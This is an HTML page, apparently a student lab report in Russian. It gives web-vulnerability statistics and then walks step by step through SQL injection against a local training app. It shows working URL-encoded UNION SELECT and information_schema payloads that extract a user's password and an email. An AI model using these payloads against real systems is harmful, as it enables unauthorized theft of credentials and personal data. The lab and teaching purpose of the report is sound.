@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>228894114</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<h1 id="лабораторная-работа-1">Лабораторная работа №1</h1>
+<h2 id="часть-1-исследование-веб-уязвимостей">Часть 1: Исследование
+веб-уязвимостей</h2>
+<h3 id="источники">Источники</h3>
+<ol type="1">
+<li><p><strong>Indusface (2025)</strong> — State of Application Security
+Report<br />
+https://www.indusface.com/resources/research-reports/state-of-application-security-2025-report/</p></li>
+<li><p><strong>PurpleSec (2024)</strong> — Cybersecurity
+Statistics<br />
+https://purplesec.us/resources/cybersecurity-statistics/</p></li>
+<li><p><strong>PortSwigger</strong> — Web Security Academy: SQL
+Injection<br />
+https://portswigger.net/web-security/sql-injection</p></li>
+</ol>
+<h3 id="доля-успешных-атак-через-веб-уязвимости">Доля успешных атак
+через веб-уязвимости</h3>
+<p><strong>Indusface (2025):</strong> - За 2024 год обнаружено
+<strong>26 000 критических и высоких уязвимостей</strong> - 33%
+уязвимостей не исправлялись более 180 дней - Рост атак на
+веб-приложения: <strong>+94%</strong> (Q1→Q4 2024) - Рост атак на API:
+<strong>+873%</strong></p>
+<p><strong>PurpleSec (2024):</strong> - <strong>50% сайтов</strong>
+имели ≥1 серьёзную уязвимость в 2021 г. - Вредоносные запросы к
+веб-приложениям: <strong>+88%</strong> за год - <strong>9 из 10
+веб-приложений</strong> уязвимы для атак</p>
+<h3 id="распределение-по-конкретным-уязвимостям">Распределение по
+конкретным уязвимостям</h3>
+<h4 id="топ-5-уязвимостей-indusface-2025">Топ-5 уязвимостей (Indusface,
+2025)</h4>
+<table>
+<thead>
+<tr class="header">
+<th>Место</th>
+<th>Уязвимость</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>Possible Blind SQL Injection</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>Server Side Request Forgery (SSRF)</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>HTML Injection</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>Cross-Site Scripting (XSS)</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>SQL Injection</td>
+</tr>
+</tbody>
+</table>
+<h4 id="статистика-атак-по-типам-purplesec">Статистика атак по типам
+(PurpleSec)</h4>
+<table>
+<thead>
+<tr class="header">
+<th>Тип атаки</th>
+<th>Доля</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Web-based attack</td>
+<td>49%</td>
+</tr>
+<tr class="even">
+<td>Phishing / Social Engineering</td>
+<td>43%</td>
+</tr>
+<tr class="odd">
+<td>General Malware</td>
+<td>35%</td>
+</tr>
+<tr class="even">
+<td>SQL Injection</td>
+<td>26%</td>
+</tr>
+<tr class="odd">
+<td>Cross-Site Scripting</td>
+<td>11%</td>
+</tr>
+</tbody>
+</table>
+<h2 id="часть-2-практическая-работа-с-sql-injection">Часть 2:
+Практическая работа с SQL Injection</h2>
+<h3 id="задание-1-получить-пароль-пользователя-volk2">Задание 1:
+Получить пароль пользователя Volk2</h3>
+<h4 id="ход-рассуждений">Ход рассуждений</h4>
+<p><strong>Что такое SQL Injection?</strong><br />
+Это метод внедрения произвольного SQL-кода через входные параметры
+приложения. Если входные данные не валидируются, злоумышленник может
+изменить логику запроса и получить доступ к конфиденциальным данным.</p>
+<p><strong>Шаг 1. Попробуем подставлять разные значения айди в
+пармаетр</strong></p>
+<p><code>http://localhost:8080/task/?id=1</code></p>
+<p>Ваш id:1 </br> Ваш логин:admin</p>
+<p><strong>Нужные значения</strong></p>
+<p><code>http://localhost:8080/task/?id=9</code></p>
+<p>Ваш id:9 </br> Ваш логин:Volk2</p>
+<p><code>http://localhost:8080/task/?id=4</code></p>
+<p>Ваш id:4 </br> Ваш логин:Vinni-pukh</p>
+<p><strong>Шаг 2. Проверим на уязвимость, подставив кавычку в
+запрос</strong></p>
+<p><code>http://localhost:8080/task/?id=1'</code></p>
+<p>Результат: You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the right syntax to
+use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+<h4 id="вывод-уязвимость-есть">Вывод: уязвимость есть</h4>
+<p><strong>Шаг 3 Для дальнейшего использования union select нужно узнать
+число колоном в таблице. Сделаем это, вводя ORDER BY пока не получим
+ошибку</strong></p>
+<p><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%201--%20</code></p>
+<p>результат: </br> Ваш id:1 </br> Ваш логин:admin</p>
+<p><code>http://localhost:8080/task/?id=1%27%20ORDER%20BY%204--%20</code></p>
+<p>результат: Unknown column ‘4’ in ‘order clause’</p>
+<p>значит можем сделать вывод, что в таблице 3 колонки</p>
+<p><strong>Шаг 4 Попробуем извлечь пароль из таблицы с помощью union
+select</strong></p>
+<p><code>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20password,id,username%20FROM%20table%20WHERE%20id=9--%20</code></p>
+<p>результат: You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the right syntax to
+use near ‘table WHERE id=9–’ LIMIT 0,1’ at line 1</p>
+<p>видимо название таблицы указано неверно, предположу,что таблица
+назвывается users</p>
+<p><code>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20password,id,username%20FROM%20users%20WHERE%20id=9--%20</code></p>
+<p>результат: </br> Ваш id:Wa spoiuuuuu </br> Ваш логин:9</p>
+<h3 id="вывод-пароль-юзера-volk2---wa-spoiuuuuu">Вывод: пароль юзера
+Volk2 - Wa spoiuuuuu</h3>
+<h3 id="задание-2-получить-email-пользователя-vinni-pukh">Задание 2:
+Получить email пользователя Vinni-pukh</h3>
+<p><strong>Шаг 1 Получим названия всех таблиц из базы
+данных</strong></p>
+<p>Т.к. в первой таблице есть только 3 колонки (password, id и
+username), логично предположить, что email хранится в другой таблице</p>
+<p>Используем <code>information_schema</code></p>
+<p><code>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()%2D%2D%20</code></p>
+<p>результат: </br> Ваш id:emails,users </br> Ваш логин:1</p>
+<p>Значит вторая таблица называется <em>emails</em></p>
+<p>с помощью той же <code>information_schema</code> выведем названия
+столбцов таблицы</p>
+<p><code>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(column_name),1,2%20FROM%20information_schema.columns%20WHERE%20table_name=%27emails%27%23</code></p>
+<p>получим: </br> Ваш id:id,email_id </br> Ваш логин:1</p>
+<p>**Шаг 2 Используем аналогичный запрос из 1 задания с union select для
+получения email-а пользователя Vinni-pukh (его id=4, это мы также узнали
+в 1 задании)</p>
+<p><code>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20email_id,1,2%20FROM%20emails%20WHERE%20id=4%23</code></p>
+<p>результат: </br> Ваш id:honey_lover@otus-lab.com </br> Ваш
+логин:1</p>
+<p>Вывод: искомый email - honey_lover@otus-lab.com</p>
+</body>
+</html>
